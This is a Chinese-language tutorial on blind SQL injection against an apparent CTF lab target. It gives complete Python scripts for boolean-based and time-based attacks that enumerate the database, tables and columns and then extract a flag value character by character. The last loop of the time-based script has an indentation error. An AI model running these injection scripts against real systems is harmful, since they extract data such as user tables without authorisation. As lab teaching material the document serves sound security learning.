# 盲注

一、概述
盲注是指在不知道数据库返回值的情况下对数据中的内容进行猜测，实施SQL注入，盲注一般分为布尔盲注和基于时间的盲注和报错的盲注。

##### 二、布尔盲注
1. 需要用到的sql函数

```
length()              # 字符长度
Substr()              # 截取字符
ascii()               # 返回ascii编码
sleep(n)              # 睡眠
if(条件,True,False)   # 判断
```
2. 盲注基本流程

```
1.判断是否能注入
2.获得数据库名长度
3.暴力获得数据库名
4.获得数据库中表的数量，表名的长度，甚至表名
5.当定位到flag表时，可暴力获得表的列数，列名
6.暴力获取flag表中flag字段

```

3. 如何注入

暴力获取方式(工具)有多种BurpSuite，Yakit等等。在这里我们是手搓代码脚本(Python)

 * 我们先了解一下python库

`requests`requests 是一个常用的 HTTP 请求库，可以方便地向网站发送 HTTP 请求，并获取响应结果

一个简单的requests代码:


    import requests        # 导入requests库申请书
    
    url="    "             # 发送请求的地址  例url="http://9eu5dpp.haobachang.loveli.com.cn:8888/check"

    headers = {            # 编写请求头
    "Host": "         ",   # 请求的地址  例"Host":"9eu5dpp.haobachang.loveli.com.cn:8888"
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "zh-CN,zh;q=0.9",
    }


    response = requests.get(url=url,params=params,headers=headers,)  #发送请求（get请求）
    
    print(response.status_code)  # 获取响应状态码
    print(response.headers)  # 获取响应头
    print(response.content)  # 获取响应内容


requests更多响应信息如下:
| 属性或方法 | 说明 |
| ------------- | ------------- |
| apparent_encoding     | 编码方式  |
| close()               |关闭与服务器的连接 |                
|content                |返回响应的内容，以字节为单位|
|cookies	            |返回一个 CookieJar 对象，包含了从服务器发回的 cookie|
|elapsed	            |返回一个 timedelta 对象，包含了从发送请求到响应到达之间经过的时间量，可以用于测试响应速度。比如 r.elapsed.microseconds 表示响应到达需要多少微秒。|
|encoding               |解码 r.text 的编码方式|
|headers	            |返回响应头，字典格式|
|history	            |返回包含请求历史的响应对象列表（url）|
|is_permanent_redirect	|如果响应是永久重定向的 url，则返回 True，否则返回 False|
|is_redirect	        |如果响应被重定向，则返回 True，否则返回 False|
|iter_content()	        |迭代响应|
|iter_lines()	        |迭代响应的行|
|json()	                |返回结果的 JSON 对象 (结果需要以 JSON 格式编写的，否则会引发错误)|
|links	                |返回响应的解析头链接|
|next	                |返回重定向链中下一个请求的 PreparedRequest 对象|
|ok	                    |检查 "status_code" 的值，如果小于400，则返回 True，如果不小于 400，则返回 False|
|raise_for_status()	    |如果发生错误，方法返回一个 HTTPError 对象|
|reason	                |响应状态的描述，比如 "Not Found" 或 "OK"|
|request	            |返回请求此响应的请求对象|
|status_code	        |返回 http 的状态码，比如 404 和 200（200 是 OK，404 是 Not Found）|
|text	                |返回响应的内容，unicode 类型数据|
|url	                |返回响应的 URL  |
|json                   |获得json数据|

requests更多方法:
|  属性或方法|说明  |
| ---------------------------|---------------------------------------- |
|delete(url, args)	            |发送 DELETE 请求到指定 url|
|get(url, params, args)	        |发送 GET 请求到指定 url|
|head(url, args)	             |   发送 HEAD 请求到指定 url|
|patch(url, data, args)	        |发送 PATCH 请求到指定 url|
|post(url, data, json, args)	 |   发送 POST 请求到指定 url|
|put(url, data, args)	        |发送 PUT 请求到指定 url|
|request(method, url, args)	    |向指定的 url 发送指定的请求方法|

* 爆破主要是通过for循环来完成
















































```
import requests                                                ## 导入requests库申请书
import string                                                  ## 导入string库
url="http://tbd1kua.haobachang.loveli.com.cn:8888/check"       ##爆破地址注意check 是JSON接口
cand_chars=string.ascii_lowercase+string.digits+"_ @ . - { }"  ##爆破字典
# 定义请求头
headers = {
    "Host": "tbd1kua.haobachang.loveli.com.cn:8888",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "zh-CN,zh;q=0.9",
}



# --------------------------------------------------------------------------------
# 1.通过循环i从1到无穷，使用length(database()) = i获取库名长度，i是长度，直到返回页面提示query_success即猜测成功
# 2.获得库名长度i后，使用substr(database(),i,1)将库名切片，循环i次，i是字符下标，每次循环要遍历字母表[a-z]作比较，即依次猜每位字符
# 3.下一步是获取数据库内的表数量，使用mysql的查询语句select COUNT(*)。同样，要一个1到无穷的循环
# 4、根据库名和表数量爆表名长度.得到表数量i后，i就是循环次数，i是表的下标-1，大循环i次（遍历所有表），这里的i从0开始，使用limit i ,1限定是第几张表，内嵌循环j从1到无穷（穷举所有表名长度可能性）尝试获取每个表的表名长度
# 5 对表爆列数量
# 6 对表爆列名长度注意观察limit i,1i从0开始（第i+1列)
# 7 对表爆列名
# 8 爆字段值
#--------------------------------------------------------------------------------
#获取库名长度
for i in range(1,18):
    payload=f"1 and length(database())={i}"
    params={"id": payload}#替换请求参数中的id值为payload 
     # 发送GET请求（设置超时，避免卡死）
    response = requests.get(
                url=url,
                params=params,
                headers=headers,
                timeout=5
            )
    m=f"第{i}次 | 状态码:{response.status_code} | 响应片段:{response.text[:500]}"
    if "true" in m:
        print(m)#数据库名长为17
#获得库名------------------------------------------------------------------------
name=""
for i in range(1,18):
    for str in cand_chars:
        payload=f"1 and substr(database(),{i},1)='{str}'"
        params={"id": payload}#替换请求参数中的id值为payload
        response = requests.get(
                url=url,
                params=params,
                headers=headers,
                timeout=5
            )
        m=f"第{i}次 | 状态码:{response.status_code} | 响应片段:{response.text[:500]}"
        if "true" in m:
            name+=str          #sql_injection_lab是数据库名
            print(name)
#获得库中表的数量--------------------------------------------------------------
for i in range(1,18):
    payload=f"1 and (select COUNT(*) from information_schema.tables where table_schema=database())={i}"   ##COUNT(*)：统计满足上述条件的记录行数 → 最终效果是统计当前数据库下有多少张表
    params={"id": payload}#替换请求参数中的id值为payload
    response = requests.get(
                url=url,
                params=params,
                headers=headers,
                timeout=5
            )
    m=f"第{i}次 | 状态码:{response.status_code} | 响应片段:{response.text[:500]}"
    if "true" in m:
        print(m)#数据库中有2个表
#获得表名长度--------------------------------------------------------------------
for i in range(0,2):
    for j in range(1,18):
        payload=f"1 and length((select table_name from information_schema.tables where table_schema=database() limit {i},1))={j}"
        params={"id": payload}#替换请求参数中的id值为payload
        response = requests.get(
                url=url,
                params=params,
                headers=headers,
                timeout=5
            )
        m=f"第{i}次 | 状态码:{response.status_code} | 响应片段:{response.text[:500]}"
        if "true" in m:
            print(m+f"表名长度为{j}")#两张表的表名长度分别是5和4，表名长度为4的表为flag
#获得表名------------------------------------------------------------------------
name=""
for i in range(0,2):
    for j in range(1,6):
        for str in cand_chars:
            payload=f"1 and substr((select table_name from information_schema.tables where table_schema=database() limit {i},1),{j},1)='{str}'"
            params={"id": payload}#替换请求参数中的id值为payload
            response = requests.get(
                url=url,
                params=params,
                headers=headers,
                timeout=5
            )
            m=f"第{i}次 | 状态码:{response.status_code} | 响应片段:{response.text[:500]}"
            if "true" in m and " "not in str :
                name+=str
                print(name)          #两张表的表名分别是users和flag
#获得flag表的列名数量------------------------------------------------------------
for i in range(1,18):
    payload=f"1 and (select COUNT(*) from information_schema.columns where table_schema=database() and table_name='flag')={i}"
    params={"id": payload}#替换请求参数中的id值为payload
    response = requests.get(
                url=url,
                params=params,
                headers=headers,
                timeout=5
            )
    m=f"第{i}次 | 状态码:{response.status_code} | 响应片段:{response.text[:500]}"
    if "true" in m:
        print(m+f"列名数量为{i}")#flag表中有2列
#获得flag表的列名长度------------------------------------------------------------
for i in range(0,2):#flag表中有2列
    for j in range(1,18):
        payload=f"1 and length((select column_name from information_schema.columns where table_schema=database() and table_name='flag' limit {i},1))={j}"
        params={"id": payload}#替换请求参数中的id值为payload
        response = requests.get(
                url=url,
                params=params,
                headers=headers,
                timeout=5
            )
        m=f"第{i}次 | 状态码:{response.status_code} | 响应片段:{response.text[:500]}"
        if "true" in m:
            print(m+f"列名长度为{j}")#第一列的列名长度为2，第二列的列名长度为4
#获得flag表的列名----------------------------------------------------------------
for i in range(0,2):#flag表中有2列
    for j in range(1,5):
        for str in cand_chars:
            payload=f"1 and substr((select column_name from information_schema.columns where table_schema=database() and table_name='flag' limit {i},1),{j},1)='{str}'"
            params={"id": payload}#替换请求参数中的id值为payload
            response = requests.get(
                url=url,
                params=params,
                headers=headers,
                timeout=5
            )
            m=f"第{i}次 | 状态码:{response.status_code} | 响应片段:{response.text[:500]}"
            if "true" in m and " "not in str :
                print(m+f"列名为{str}")#flag表的第一列名为id第二列名为flag
#获得flag表的flag字段的值------------------------------------------------------
for i in range(1,50):
    for str in cand_chars:
        payload=f"1 and substr((select flag from flag limit 0,1),{i},1)='{str}'"
        params={"id": payload}#替换请求参数中的id值为payload
        response = requests.get(        
                url=url,
                params=params,
                headers=headers,
                timeout=5
            )
        m=f"第{i}次 | 状态码:{response.status_code} | 响应片段:{response.text[:500]}"
        if "true" in m and " "not in str :
            print(m+f"flag值为{str}")#flag表的flag字段的值为flag{69e5199d4a}




#--------------------------------------------------------------------------------

```










# 时间盲注
    代码块
    import requests                                                ## 导入requests库申请书
    import string                                                  ## 导入string库
    import time                                                    ## 导入time库
    url="http://9eu5dpp.haobachang.loveli.com.cn:8888/check"       ##爆破地址注意check 是JSON接口
    cand_chars=string.ascii_lowercase+string.digits+"_ @ . - { }"  ##爆破字典
    #写请求头
    headers = {
    "Host": "9eu5dpp.haobachang.loveli.com.cn:8888",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "zh-CN,zh;q=0.9",
    }

    #获得库名长度-------------------------------------------------------------------
    for i in range(1,100):
        payload=f"1 and if(length(database())={i},sleep(1),1)"
        params={"id": payload} 
        start_time=time.time()             #记录请求开始时间
        response = requests.get(
                url=url,
                params=params,
                headers=headers,              
        )
        end_time=time.time()               #记录请求结束时间
    
        if end_time-start_time>1:
            print(f"数据库名长度为:{i}")    #数据库名长为17
            break
    #获得库名-----------------------------------------------------------------------
    name=""
    for i in range(1,18):
        for str in cand_chars:
            payload=f"1 and if(substr(database(),{i},1)='{str}',sleep(1),1)"
            params={"id": payload} 
            start_time=time.time()          #记录请求开始时间
            response = requests.get(
                url=url,
                params=params,
                headers=headers,              
            )
            end_time=time.time()           #记录请求结束时间
        
            if end_time-start_time>1:
                name+=str
                print(name)
                break
    #数据库内的表数量-----------------------------------------------------------------
    for i in range(1,100):
        payload=f"1 and if((select COUNT(*) from information_schema.tables where table_schema=database())={i},sleep(1),1)"
        params={"id": payload} 
        start_time=time.time()#记录请求开始时间
        response = requests.get(
            url=url,
            params=params,
            headers=headers,              
        )
        end_time=time.time()#记录请求结束时间
    
        if end_time-start_time>1:
            print(f"数据库内的表数量为:{i}")
            break
    #获得表名长度-------------------------------------------------------------------------
    for i in range(0,4):#length((select table_name from information_schema.tables where table_schema=database() limit {i},1))={j}
        for j in range(1,100):
            payload=f"1 and if(length((select table_name from information_schema.tables where table_schema=database() limit {i},1))={j},sleep(2),1)"
            params={"id": payload} 
            start_time=time.time()#记录请求开始时间
            response = requests.get(
                url=url,
                params=params,
                headers=headers,              
            )
            end_time=time.time()#记录请求结束时间
    
            if end_time-start_time>1:
                print(f"表名长度为:{i}")
                break    

    #获得表名-------------------------------------------------------------------------

    name=""
    for i in range(0,2):
        for j in range(1,6):
            for str in cand_chars:
                payload=f"1 and if(substr((select table_name from information_schema.tables where table_schema=database() limit {i},1),{j},1)='{str}',sleep(1),1)"
                params={"id": payload} 
                start_time=time.time()#记录请求开始时间
                response = requests.get(
                    url=url,
                    params=params,
                    headers=headers,              
                )
                end_time=time.time()#记录请求结束时间
            
                if end_time-start_time>1:
                    name+=str
                    print(name)
                    break            #两张表的表名分别是users和flag
    #获得flag表的列名数量------------------------------------------------------------

    for i in range(1,18):
        payload=f"1 and if((select COUNT(*) from information_schema.columns where table_schema=database() and table_name='flag')={i},sleep(1),1)"##COUNT(*)：统计满足上述条件的记录行数
        params={"id": payload}#替换请求参数中的id值为payload
        start_time=time.time()#记录请求开始时间
        response = requests.get(
                url=url,
                params=params,
                headers=headers,
                
            )
        end_time=time.time()#记录请求结束时间
        if end_time-start_time>1:
            print(f"列名数量为{i}")#flag表中有2列
            break
    #获得flag表的列名长度------------------------------------------------------------

    for i in range(0,2):          #flag表中有2列
        for j in range(1,18):
            payload=f"1 and if(length((select column_name from information_schema.columns where table_schema=database() and table_name='flag' limit {i},1))={j},sleep(1),1)"
            params={"id": payload}#替换请求参数中的id值为payload
            start_time=time.time()#记录请求开始时间
            response = requests.get(
                url=url,
                params=params,
                headers=headers,
                
            )
            end_time=time.time()#记录请求结束时间
            if end_time-start_time>1:
                print(f"列名长度为{j}")   #flag表的第一列名长为2第二列长为4
                break
        
    #获得flag表的列名----------------------------------------------------------------
    for i in range(0,2):#flag表中有2列
        for j in range(1,5):
            for str in cand_chars:
                payload=f"1 and if(substr((select column_name from information_schema.columns where table_schema=database() and table_name='flag' limit {i},1),{j},1)='{str}',sleep(1),1)"
                params={"id": payload}#替换请求参数中的id值为payload
                start_time=time.time()#记录请求开始时间
                response = requests.get(
                    url=url,
                    params=params,
                    headers=headers,
                
                )
                end_time=time.time()#记录请求结束时间
                if end_time-start_time>1:
                    print(str)         #flag表的第一列名为id第二列名为flag

                    break
    #获得flag表的flag字段的值------------------------------------------------------
    flag=""
    for i in range(1,50):
        for j in range(32,128):


            payload=f"1 and if(ascii(substr((select flag from flag limit 0,1),{i},1))={j},sleep(1),1)"
            params={"id": payload}#替换请求参数中的id值为payload
            start_time=time.time()#记录请求开始时间
            response = requests.get(        
                url=url,
                params=params,
                headers=headers,
                
             )
         end_time=time.time()#记录请求结束时间

            if end_time-start_time>1 and j!=32:#32是空格
                flag+=chr(j)#将ASCII码转换为字符
            
                print(flag)
                break


    

















































